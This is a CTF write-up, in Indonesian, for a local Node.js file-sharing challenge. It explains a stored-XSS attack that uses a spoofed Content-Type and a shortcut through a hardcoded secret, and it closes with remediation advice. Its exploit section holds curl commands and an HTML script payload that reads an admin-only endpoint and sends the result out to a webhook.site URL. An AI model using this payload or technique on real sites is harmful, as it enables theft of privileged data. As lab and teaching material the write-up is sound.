# Keisengan Kecil — CTF Writeup

**Category:** Injection | **Difficulty:** Medium | **Points:** 50  
**Author:** WanZKey

---

## Challenge Info

| | |
|---|---|
| Target | `http://localhost:1337` |
| Credentials | `WanZKey:anyaunyu` (member) |
| Objective | Ungkap rahasia admin |
| Flag | `pwn{2957ce4f6b7435dc3e9857da920f1e8f}` |

Ada dua service: **web** (Node.js/Express) dan **victim** (Puppeteer bot yang login sebagai admin dan review file yang diupload member).

---

## Recon

Dari `server.js` ada beberapa endpoint menarik:

```
POST /api/w/:workspaceId/files   → register upload session
POST /api/upload/:fileId         → upload file
GET  /files/:fileId?action=view  → serve file (inline)
GET  /api/admin/secret           → FLAG (admin only)
GET  /admin/files                → list files (admin only, bot visit sini)
```

Bot melakukan:
1. Login via `POST /api/login` sebagai admin
2. GET `/admin/files` → parse HTML, cari link file
3. Visit setiap file baru via Puppeteer dengan session admin

---

## Vulnerability Analysis

### Vuln #1 — User-Controlled Content-Type (Stored XSS)

Register upload session menerima `contentType` dari body **tanpa validasi**:

```js
// server.js
app.post('/api/w/:workspaceId/files', requireAuth, (req, res) => {
  const { contentType, fileName, fileSize, useCase } = req.body;

  // Hanya validasi ekstensi!
  const allowedExtensions = ['.png', '.jpg', '.gif', '.pdf', '.docx'];
  const ext = path.extname(fileName || '').toLowerCase();

  DB.files[fileId] = {
    contentType: contentType,  // ← LANGSUNG DISIMPAN DARI USER
    fileName: fileName,
    ...
  };
});
```

Saat file diakses, Content-Type diset dari nilai yang disimpan:

```js
app.get('/files/:fileId', requireAuth, (req, res) => {
  res.setHeader('Content-Type', fileMeta.contentType);  // ← USER CONTROLLED
  if (action === 'view') {
    res.setHeader('Content-Disposition', 'inline; filename="' + fileMeta.fileName + '"');
  }
  res.sendFile(fileMeta.localPath);
});
```

**Impact:** Upload file `.gif` dengan `contentType: text/html` → browser render sebagai HTML → **XSS**.

---

### Vuln #2 — Hardcoded SECRET di Entrypoint (Bonus Path)

Saat investigasi Docker image, berhasil extract `entrypoint.sh`:

```bash
docker create --name tmp_web ghcr.io/hengkerrusia/collabspace-web:latest
docker cp tmp_web:/app/entrypoint.sh ./entrypoint_orig.sh
```

Isinya:

```sh
#!/bin/sh
SECRET="makanberas"
PWN="${PWN:-player}"

# Password DETERMINISTIK dari SECRET
ADMIN_PASSWORD=$(echo -n "${SECRET}_admin" | md5sum | awk '{print $1}')

# Flag DETERMINISTIK dari SECRET + PWN
HASH=$(echo -n "${SECRET}${PWN}" | md5sum | awk '{print $1}')
FLAG="pwn{${HASH}}"

echo $FLAG >> /dev/shm/.flag.txt
echo $ADMIN_PASSWORD >> /dev/shm/.admin_password.txt

unset SECRET
rm -- "$0"
exec node /app/server.js
```

SECRET hardcoded → password dan flag bisa dihitung tanpa XSS sama sekali.

---

## Exploit

### Path 1: Direct Computation (Unintended Shortcut)

Karena SECRET diketahui dari entrypoint.sh:

```python
import hashlib

SECRET = "makanberas"
PWN    = "WanZKey"

admin_pass = hashlib.md5(f"{SECRET}_admin".encode()).hexdigest()
# → 783fc0dcf7a4a124c828c182f002d2f9

flag_hash  = hashlib.md5(f"{SECRET}{PWN}".encode()).hexdigest()
flag       = f"pwn{{{flag_hash}}}"
# → pwn{2957ce4f6b7435dc3e9857da920f1e8f}
```

> **Gotcha:** `fs.readFileSync` baca file termasuk trailing `\n` dari `echo`. Jadi password yang tersimpan di server adalah `"783fc0dcf7a4a124c828c182f002d2f9\n"` — login harus pakai password + newline!

```bash
curl -c /tmp/cookies.txt -X POST http://localhost:1337/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"783fc0dcf7a4a124c828c182f002d2f9\n"}'

curl -b /tmp/cookies.txt http://localhost:1337/api/admin/secret
# {"secret":"pwn{2957ce4f6b7435dc3e9857da920f1e8f}\n"}
```

---

### Path 2: Intended — Stored XSS via Bot

**Step 1** — Login sebagai member:

```bash
curl -c cookies.txt -X POST http://localhost:1337/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"WanZKey","password":"anyaunyu"}'
```

**Step 2** — Register upload session dengan Content-Type spoofed:

```bash
curl -b cookies.txt -X POST http://localhost:1337/api/w/ws_prod_2024/files \
  -H 'Content-Type: application/json' \
  -d '{
    "contentType": "text/html; charset=utf-8",
    "fileName": "thumbnail.gif",
    "fileSize": 512,
    "useCase": "image"
  }'
# Response: {"file":{"sId":"<fileId>","uploadUrl":"...","downloadUrl":"..."}}
```

**Step 3** — Upload XSS payload:

```html
<!-- pwn.gif (isinya HTML) -->
<script>
(async () => {
  const r = await fetch('/api/admin/secret', {credentials: 'include'});
  const d = await r.json();
  const enc = btoa(JSON.stringify(d));
  new Image().src = 'https://webhook.site/TOKEN?x=' + encodeURIComponent(enc);
})();
</script>
```

```bash
curl -b cookies.txt -X POST http://localhost:1337/api/upload/<fileId> \
  -F "file=@pwn.gif;type=text/html"
```

**Step 4** — Tunggu bot admin visit file (~15 detik):

Bot melakukan `GET /admin/files`, menemukan link file baru, lalu membuka `/files/<fileId>?action=view` dengan Puppeteer menggunakan cookie admin. Browser render file sebagai HTML → XSS execute → flag ter-exfil ke webhook.

---

## Key Findings & Gotchas

**Docker /dev/shm tidak shared antar container (local setup issue)**

`/dev/shm` adalah tmpfs yang isolated per container. Bot crash dengan `ENOENT: /dev/shm/.admin_password.txt` karena file ditulis web container tapi tidak terlihat dari victim container. Fix dengan shared volume di `docker-compose.yml`:

```yaml
services:
  web:
    volumes:
      - shm_data:/dev/shm
  victim:
    volumes:
      - shm_data:/dev/shm

volumes:
  shm_data:
```

**Trailing newline dari `echo`**

`echo $ADMIN_PASSWORD >> file` menambah `\n` di akhir. `fs.readFileSync` tidak trim otomatis, jadi password tersimpan include `\n`. Login harus kirim password dengan `\n` atau server perlu `.trim()` saat compare.

---

## Flag

```
pwn{2957ce4f6b7435dc3e9857da920f1e8f}
```

---

## Remediation

- **Validasi Content-Type** — jangan percaya nilai dari user; tentukan dari magic bytes atau allowlist ketat
- **Jangan hardcode SECRET** — generate random secret saat build/deploy, bukan nilai tetap di source code
- **Tambah CSP header** — `Content-Security-Policy: default-src 'none'` untuk file yang diserve
- **Trim nilai dari file** — gunakan `.trim()` saat baca credential dari file untuk menghindari whitespace bugs
- **Shared secrets antar container** — gunakan Docker secrets atau env injection yang proper
